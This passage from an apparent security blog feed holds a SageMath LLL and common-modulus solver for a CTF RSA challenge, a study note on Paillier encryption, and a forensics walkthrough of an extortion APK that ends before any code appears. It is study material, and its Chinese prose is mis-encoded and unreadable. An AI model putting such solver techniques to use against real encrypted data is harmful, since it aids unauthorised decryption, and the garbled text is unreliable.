class="hljs-number">330800121752029915693039296018980956519</span>, <span class="hljs-number">244800084005240595691424199440981715431</span>, <span class="hljs-number">171753849214889522920105847094773384191</span>, <span class="hljs-number">175843874533972361422410968920873382741</span>, <span class="hljs-number">326554577162848075059517044795930784993</span>, <span class="hljs-number">181842368629269753698222635712342485771</span>, <span class="hljs-number">221634122983362091660188171985742369561</span>, <span class="hljs-number">314244561819808202322467576330355199409</span>, <span class="hljs-number">286703236198397527318161582654787197007</span>, <span class="hljs-number">298101543059628501506668748374542117409</span>, <span class="hljs-number">304158884506393754601331945634109778837</span>, <span class="hljs-number">227577031261920314010408499530794497453</span>]<br>out= [<span class="hljs-number">100163998802948218573427220530909801629443946118807841130458771881611961921044413091457977957530737347507311468578174294420439883266450142918647561103714976340598499984679873518770686239019753272419975426555435266764099822607336645955391865380657632176223122712125661464370522088500110746571354290680063421912</span>, <span class="hljs-number">123528268396018633078964378145622645321836134964966941909300627704018826667414656614011250938241127521627117348901416042868382174504514240509791471909819407751786633761392047187057200130450960708049681366686147337178110669163142189940397343388837018627392202704211693014162963133958078984558400205296509955066</span>, <span class="hljs-number">50364974727218716170137342348825758682286710377257708196467656986986475658591351848251278364177715325447140300281348027787487944839878770556527568407280736570303345044999352851718908253510696083227344179177110348363623815158409862985684687329665113210373028159714648637297476014803935686233984711925346269925</span>, <span class="hljs-number">9159042298258514259206302054907530984498816597282237786310355131965025367180505822032135021520906576471052417629425493533222088036674196397387325202128095476044308794426593565419139845832998557280786358482011226957053125314152322427131984411160984485669030286331376124575677908877399942011661647598763754231</span>, <span class="hljs-number">83466948172962290899792524342204996697711370224947233607865306692546824512672969402433314856742908546253967225963904395036102408684746619744412073888614033881366518452878344698289278946024167788789718690655953517892282374396760436658422838909903123439370164929347147855359470889455753772857233516742991766128</span>, <span class="hljs-number">72028057477369331020972407277180913909557985390590548305094935208898254733240351763155769013959589016793318772858662702447133499307826143247356049051993727167694036585280387890126287679890730586145740176250715386149857291210207281073772478229355625725300592003798974298248102432508449566953296818450441875311</span>, <span class="hljs-number">63397152736399466888877444377156185012692670493456346196278062009641363047685720620967313379507212944658351683022480839941265221126018392433078546696140135677499181555082643172378488800458657825640013090182171355299282023794908520172571785687147143015581400891531296496177973817400317905868361800342940667657</span>, <span class="hljs-number">45427004823510815929685208038284324980662968275105063862891077759131069014314933978878667052450145039482242546093735499108826130367476890384431317243013990394189191560941678120985717370542332803012619694821129395559214706968432476548145608291516176910849698455496733056096163035964057523545705356926187216133</span>, <span class="hljs-number">85046100612081858546755294340770681541320509587396377967875404950325314121709046137842413744740490231945105758075761946555179595664901813127463402854440384657046429776033129391138370272524736543471909307910018577738207910417672603889922445435939876023878220177983424547612635006926243055642166274730894301704</span>, <span class="hljs-number">5833380233103086014860892228744764647016585478949686583145531659689295506666493518453642500086277427538189091865461553097914845680665917702500908205558454036911757659426809969367680394533585635383007758339917554453268182491874683638880986360065633842854622244953985055815937671635222264056071882344388307409</span>, <span class="hljs-number">83587615309194701727032548415548847571046191382552371312058083137102227325098839286526833147951063338204327145093831238962818333112251936853329663907079943414231588222256242520221314528944937229985997926851198158564313703719031124442094987245466116488897263358510493905440842917634723859176839440753120904481</span>, <span class="hljs-number">108651960334634726889543063749359050688114025706494125848785084643330096858725917513596985853593252388835207675036982640195609499739937405655156895161071906340785173459426867946058638393154997931747445494284445204735492709747637173698383609764016673932827648159152658645291248613736662020472251048171789274368</span>, <span class="hljs-number">118612010487916657134965416492319303083994743753602531817008130269546146141506819718265549648441671373744766173780682168587021797626910931105508317440664521595783406848956221465897709761805869130021172013000282497881581247777388315282629463546261696169893882772397797722134711444928443061384985458691749569847</span>, <span class="hljs-number">106808406616890955924408992591724627593882118490933791849624747503316110669154243209826761617940864170830792705070618439466645580274835929100331418955890808763286193770831205511071440703609240364726061677822134370309018443508205980554831705850988319397384130044484586798585896460152167042282847992593429629533</span>, <span class="hljs-number">88091869606421350393441194783722851111189272445506506936925797213395319937783082680078622732926273935980894566775394134783157488360516905477700601820480975112122167589887641130656305741351643175495552454293030309247254533571254198691204714097846510872592569447050033289483493274672346210063885124570695832880</span>, <span class="hljs-number">94400859500860667431780782962782396345261822402898708716634581228428633704975879685572548692997007974004673676539496590659276952154740096463133011458100387006276325192223993452314873089466451613079029429327880672384210802191677586975844471189127835578979108767548290181668434770385199468588493042256788539610</span>, <span class="hljs-number">76177813724283720012398394789596589415486093955132688784865364048503447246391866424200071522136707581280434193680972230914105236504028522288780213089260160776489804587209115330412067560802680789338779056583047491942817016437672075192528508677997165703606520158178725128251694801612417667440677124932361973397</span>, <span class="hljs-number">17188209523466762369281362386525396145127294763502094183797065621821932913685690176344514910405677170931795652509426794846131051983826422536084073462084935517166603832542862106287058675490933197600813710203114108790043880150305327523679949543592622443904084453387396870899883324751789625806819506542619123964</span>, <span class="hljs-number">120007173989070249117019147454557020213723707722383599019972471016186584968096445904023372671513462965078400715365736756710078805039115601609874780421117795585342458478316236202328120583456334489780231976628584606042971207759763658961365139429661536955996519512283283500790612975034779837647053750631763512799</span>, <span class="hljs-number">18797057418663411295612229938999282286746920748194349166509084258061650142260043277698907538088835210620841171754186980908772147495732980563542600139935202965632319542217264685208215907551992891370166006725534397313373079841419662622936316343820775075897977228084528246337988431658221881343556854053475137330</span>]<br><br>n1 = <span class="hljs-number">20</span><br><span class="hljs-keyword">for</span> D <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    m = matrix(ZZ,n1,n1+<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n1):<br>        m[i,i] = <span class="hljs-number">1</span><br>        m[i,n1] = D*e[i]<br>    L = m.LLL()<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    if L[0][-1] == D:</span><br><span class="hljs-string">        print(D)</span><br><span class="hljs-string">        print(L)</span><br><span class="hljs-string">        break</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    m1 = prod([x ^ y <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(out,L[<span class="hljs-number">0</span>][:-<span class="hljs-number">1</span>])])<br>    m2 = prod([x ^ y <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(out,L[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])])<br><br>    n = gcd(m1.numer() - m1.denom(), m2.numer() - m2.denom())<br>    <span class="hljs-comment">#print(n)</span><br>    e_list = [<span class="hljs-number">2333</span>,<span class="hljs-number">23333</span>]<br>    c_list = [c1,c2]<br>    g,x,y = xgcd(e_list[<span class="hljs-number">0</span>],e_list[<span class="hljs-number">1</span>])<br><br>    a = <span class="hljs-built_in">pow</span>(c_list[<span class="hljs-number">0</span>],x,n)*<span class="hljs-built_in">pow</span>(c_list[<span class="hljs-number">1</span>],y,n) % n<br>    b = output2 - a*output1 % n<br>    <br>    ans = long_to_bytes(b)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NSS&#x27;</span> <span class="hljs-keyword">in</span> ans:<br>        <span class="hljs-built_in">print</span>(ans)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure></\span></span>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CryptoåŸºç¡€ç¯‡-åŒæ€åŠ å¯†</title>
    <link href="/2025/05/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"/>
    <url>/2025/05/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="PaillieråŒæ€åŠ å¯†"><a href="#PaillieråŒæ€åŠ å¯†" class="headerlink" title="PaillieråŒæ€åŠ å¯†"></a>PaillieråŒæ€åŠ å¯†</h1><p><strong>å¯†é’¥ç”Ÿæˆï¼š</strong></p><ul><li>éšæœºé€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•°$p,q$ï¼Œæ»¡è¶³$gcd(pq,(p-1)(q-1))&#x3D;1$</li><li>è®¡ç®—$n &#x3D; pq$ï¼Œ$\lambda &#x3D;lcm(p-1,q-1)$</li><li>é€‰æ‹©éšæœºæ•´æ•°$gï¼ˆg\in Z^*_{n^2}ï¼‰$ï¼Œå®šä¹‰$L(x)&#x3D; \frac{x-1}{n}$ï¼Œæ»¡è¶³$gcd(L(g^\lambda \mod n^2),n)&#x3D;1$</li><li>è®¡ç®—$\mu &#x3D; (L(g^\lambda \mod n^2))^{-1}\mod n$</li><li>å…¬é’¥ä¸º$(n,g)$ï¼Œç§é’¥ä¸º$(\lambda,\mu)$</li></ul><blockquote><p><strong>äºŒé¡¹å®šç†ï¼š</strong><br>$(1+kn)^m\equiv knm+1 \mod n^2$<br>æ­¤æ—¶æœ‰$g^\lambda\equiv 1\mod n$ï¼Œ$g^{n\lambda}\equiv 1 \mod n^2$</p></blockquote><p><strong>ç®€åŒ–ç‰ˆï¼š</strong></p><ul><li>$g&#x3D;n+1$</li><li>$\lambda&#x3D;\phi(n)&#x3D;(p-1)(q-1)$</li><li>$\mu &#x3D; \phi(n)^{-1}\mod n$<br><strong>åŠ å¯†ï¼š</strong></li><li>æ˜æ–‡$mï¼ˆ0\leq m &lt; nï¼‰$</li><li>é€‰æ‹©éšæœºæ•°$r(0&lt;r&lt;n,r\in Z^*_{n^2})$ï¼Œä¸”$gcd(r,n)&#x3D;1$</li><li>å¯†æ–‡$c&#x3D;g^mr^n\mod n^2$<br><strong>è§£å¯†ï¼š</strong></li><li>æ˜æ–‡$m&#x3D;L(c^{\lambda}\mod n^2)\mu \mod n$</li></ul><p><strong>æ€§è´¨ï¼š</strong><br>$D(E(m_1,r_1)â‹…E(m_2,r_2)\mod n^2)&#x3D;m_1+m_2 \mod n$<br>$D(E(m_1,r_1)â‹…g^{m_2}\mod n^2)&#x3D;m_1+m_2 \mod n$<br>$D(E(m_1,r_1)^{m_2}\mod n^2)&#x3D;m_1m_2\mod n$<br>$D(E(m_2,r_2)^{m_1}\mod n^2)&#x3D;m_1m_2\mod n$<br>$D(E(m,r)^k\mod n^2)&#x3D;km\mod n$<br>$D(E(m,r)â‹…(1+n)^k\mod n^2)&#x3D;m+k\mod n$</p><p><strong>å‚è€ƒï¼š</strong> <a href="https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">å…¶ä»–åŠ å¯†ç®—æ³• | Lazzaro</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç”µå­å–è¯-é•¿å®‰æ¯2021 å­¦ä¹ è®°å½•</title>
    <link href="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>2021å¹´4æœˆ25æ—¥ï¼Œä¸Šåˆ8ç‚¹å·¦å³ï¼Œè­¦æ–¹æ¥åˆ°è¢«å®³äººé‡‘æŸæŠ¥æ¡ˆï¼Œå£°ç§°è‡ªå·±è¢«æ•²è¯ˆæ•°ä¸‡å…ƒï¼›ç»è¯¢é—®ï¼Œæ˜¨æ—¥é‡‘æŸè¢«å«Œç–‘äººè¯±å¯¼è£¸èŠï¼Œä¸‹è½½äº†æŸâ€œè£¸èŠâ€è½¯ä»¶ï¼Œå¯¼è‡´è‡ªå·±çš„é€šè®¯å½•å’Œè£¸èŠè§†é¢‘è¢«å«Œç–‘äººè·å–ï¼Œå¯¹å…¶è¿›è¡Œæ•²è¯ˆï¼Œæœ€ç»ˆé‡‘æŸä¸å ªé‡è´Ÿï¼Œé€‰æ‹©äº†æŠ¥è­¦ï¼›è­¦æ–¹ä»é‡‘æŸæä¾›çš„æœ¬äººæ‰‹æœºä¸­ï¼Œå®šå‘é‡‡é›†åˆ°äº†è¯¥â€œè£¸èŠâ€è½¯ä»¶çš„å®‰è£…åŒ…â€“zhibo.apkï¼ˆæ£€æä¸€ï¼‰ï¼Œè¯·å„ä½å›ç­”ä¸‹åˆ—é—®é¢˜ï¼šï¼ˆé¢˜ç›® ä¸­éœ€è¦é€šè¿‡åˆ†æå‡ºæ¥çš„ç­”æ¡ˆå¯¹æ£€æäºŒä¸‰å››äº”è§£å‹ï¼Œè§£å‹å¯†ç ä¸ºIPçš„æƒ…å†µï¼Œéœ€è¦åœ¨å¯†ç åå¢åŠ -CAB2021ï¼Œä¾‹192.168.110.110-CAB2021ï¼‰</p><h2 id="æ£€æ"><a href="#æ£€æ" class="headerlink" title="æ£€æ"></a>æ£€æ</h2><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503213953574.png"><br>ä½¿ç”¨VeraCryptæŒ‚è½½ï¼ŒæŒ‚è½½å¯†ç ä¸º</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">2021</span>ç¬¬ä¸‰å±ŠCAB-changancup.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><h2 id="ç¬¬ä¸€é¢˜"><a href="#ç¬¬ä¸€é¢˜" class="headerlink" title="ç¬¬ä¸€é¢˜"></a>ç¬¬ä¸€é¢˜</h2><h3 id="è¯·è®¡ç®—æ£€æä¸€Apkçš„SHA256å€¼"><a href="#è¯·è®¡ç®—æ£€æä¸€Apkçš„SHA256å€¼" class="headerlink" title="è¯·è®¡ç®—æ£€æä¸€Apkçš„SHA256å€¼"></a>è¯·è®¡ç®—æ£€æä¸€Apkçš„SHA256å€¼</h3><p>ä½¿ç”¨HashCalcè®¡ç®—<code>æ£€æä¸€-zhibo.apk</code>çš„SHA256çš„hashå€¼<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503215110738.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">3</span>fece<span class="hljs-number">1e93</span>be<span class="hljs-number">4</span>f<span class="hljs-number">422</span><span class="hljs-keyword">c</span><span class="hljs-number">8446</span>b<span class="hljs-number">77</span>b<span class="hljs-number">6863</span>eb<span class="hljs-number">6</span>a<span class="hljs-number">39</span>f<span class="hljs-number">19</span>d<span class="hljs-number">8</span>fa<span class="hljs-number">71</span>ff<span class="hljs-number">0250</span>aac<span class="hljs-number">10</span>f<span class="hljs-number">8</span>bdde<span class="hljs-number">73</span>a<br></code></pre></td></tr></table></figure><h2 id="ç¬¬äºŒé¢˜"><a href="#ç¬¬äºŒé¢˜" class="headerlink" title="ç¬¬äºŒé¢˜"></a>ç¬¬äºŒé¢˜</h2><h3 id="è¯¥APKçš„åº”ç”¨åŒ…åä¸º"><a href="#è¯¥APKçš„åº”ç”¨åŒ…åä¸º" class="headerlink" title="è¯¥APKçš„åº”ç”¨åŒ…åä¸º"></a>è¯¥APKçš„åº”ç”¨åŒ…åä¸º</h3><p>ä½¿ç”¨jadxåç¼–è¯‘ï¼ŒæŸ¥çœ‹<code>AndroidManifest.xml</code>ä¸­çš„<code>package</code>ä¾¿æ˜¯åº”ç”¨åŒ…å<code>plus.H5B8E45D3</code><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503215236584.png"></p><h2 id="ç¬¬ä¸‰é¢˜"><a href="#ç¬¬ä¸‰é¢˜" class="headerlink" title="ç¬¬ä¸‰é¢˜"></a>ç¬¬ä¸‰é¢˜</h2><h3 id="è¯¥APKç¨‹åºåœ¨å°è£…æœåŠ¡å•†çš„åº”ç”¨å”¯ä¸€æ ‡è¯†ï¼ˆAPPIDï¼‰ä¸º"><a href="#è¯¥APKç¨‹åºåœ¨å°è£…æœåŠ¡å•†çš„åº”ç”¨å”¯ä¸€æ ‡è¯†ï¼ˆAPPIDï¼‰ä¸º" class="headerlink" title="è¯¥APKç¨‹åºåœ¨å°è£…æœåŠ¡å•†çš„åº”ç”¨å”¯ä¸€æ ‡è¯†ï¼ˆAPPIDï¼‰ä¸º"></a>è¯¥APKç¨‹åºåœ¨å°è£…æœåŠ¡å•†çš„åº”ç”¨å”¯ä¸€æ ‡è¯†ï¼ˆAPPIDï¼‰ä¸º</h3><p>åœ¨<code>assets</code>æ–‡ä»¶å¤¹ä¸‹çš„<code>apps</code>ä¸­å¯ä»¥æ‰¾åˆ°appidï¼š<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503222512974.png"></p><h2 id="ç¬¬å››é¢˜"><a href="#ç¬¬å››é¢˜" class="headerlink" title="ç¬¬å››é¢˜"></a>ç¬¬å››é¢˜</h2><h3 id="è¯¥APKå…·å¤‡ä¸‹åˆ—å“ªäº›å±é™©æƒé™-å¤šé€‰é¢˜-ï¼š"><a href="#è¯¥APKå…·å¤‡ä¸‹åˆ—å“ªäº›å±é™©æƒé™-å¤šé€‰é¢˜-ï¼š" class="headerlink" title="è¯¥APKå…·å¤‡ä¸‹åˆ—å“ªäº›å±é™©æƒé™(å¤šé€‰é¢˜)ï¼š"></a>è¯¥APKå…·å¤‡ä¸‹åˆ—å“ªäº›å±é™©æƒé™(å¤šé€‰é¢˜)ï¼š</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">A</span><span class="hljs-operator">.</span>è¯»å–çŸ­ä¿¡  <br><span class="hljs-variable">B</span><span class="hljs-operator">.</span>è¯»å–é€šè®¯å½•  <br><span class="hljs-built_in">C</span><span class="hljs-operator">.</span>è¯»å–ç²¾ç¡®ä½ç½®  <br><span class="hljs-built_in">D</span><span class="hljs-operator">.</span>ä¿®æ”¹é€šè®¯å½•  <br><span class="hljs-built_in">E</span><span class="hljs-operator">.</span>ä¿®æ”¹çŸ­ä¿¡  <br></code></pre></td></tr></table></figure><p>å„ç§æƒé™ï¼š[chluo1997.github.io]</p><table><thead><tr><th>è¯»å–çŸ­ä¿¡å†…å®¹</th><th>android.permission.READ_SMSï¼Œè¯»å–çŸ­ä¿¡å†…å®¹</th></tr></thead><tbody><tr><td>è¯»å–è”ç³»äºº</td><td>android.permission.READ_CONTACTSï¼Œå…è®¸åº”ç”¨è®¿é—®è”ç³»äººé€šè®¯å½•ä¿¡æ¯</td></tr><tr><td>è·å–ç²¾ç¡®ä½ç½®</td><td>android.permission.ACCESS_FINE_LOCATIONï¼Œé€šè¿‡GPSèŠ¯ç‰‡æ¥æ”¶å«æ˜Ÿçš„å®šä½ä¿¡æ¯ï¼Œå®šä½ç²¾åº¦è¾¾10ç±³ä»¥å†…</td></tr><tr><td>å†™å…¥è”ç³»äºº</td><td>android.permission.WRITE_CONTACTSï¼Œå†™å…¥è”ç³»äººï¼Œä½†ä¸å¯è¯»å–</td></tr><tr><td>ç¼–å†™çŸ­ä¿¡</td><td>android.permission.WRITE_SMSï¼Œå…è®¸ç¼–å†™çŸ­ä¿¡</td></tr><tr><td><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250503234602651.png"></td><td></td></tr><tr><td>å› æ­¤é€‰<code>ABCDE</code></td><td></td></tr></tbody></table><h2 id="ç¬¬äº”é¢˜"><a href="#ç¬¬äº”é¢˜" class="headerlink" title="ç¬¬äº”é¢˜"></a>ç¬¬äº”é¢˜</h2><h3 id="è¯¥APKå‘é€å›åå°æœåŠ¡å™¨çš„æ•°æ®åŒ…å«ä¸€ä¸‹å“ªäº›å†…å®¹-å¤šé€‰é¢˜-ï¼š"><a href="#è¯¥APKå‘é€å›åå°æœåŠ¡å™¨çš„æ•°æ®åŒ…å«ä¸€ä¸‹å“ªäº›å†…å®¹-å¤šé€‰é¢˜-ï¼š" class="headerlink" title="è¯¥APKå‘é€å›åå°æœåŠ¡å™¨çš„æ•°æ®åŒ…å«ä¸€ä¸‹å“ªäº›å†…å®¹(å¤šé€‰é¢˜)ï¼š"></a>è¯¥APKå‘é€å›åå°æœåŠ¡å™¨çš„æ•°æ®åŒ…å«ä¸€ä¸‹å“ªäº›å†…å®¹(å¤šé€‰é¢˜)ï¼š</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">A</span><span class="hljs-operator">.</span>æ‰‹æœºé€šè®¯å½•  <br><span class="hljs-variable">B</span><span class="hljs-operator">.</span>æ‰‹æœºåº”ç”¨åˆ—è¡¨  <br><span class="hljs-built_in">C</span><span class="hljs-operator">.</span>æ‰‹æœºå·ç   <br><span class="hljs-built_in">D</span><span class="hljs-operator">.</span>éªŒè¯ç   <br><span class="hljs-built_in">E</span><span class="hljs-operator">.</span><span class="hljs-variable">GPS</span>å®šä½ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%7B9F186FA0-58B4-42EC-BF6B-4EA0FE0B68B3%7D.png"><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504170920520.png"><br>å‘ç°å¯ç–‘ä»£ç ï¼š<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504171506835.png"><br><code>sojson.v4</code>è§£å¯†å¾—åˆ°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span 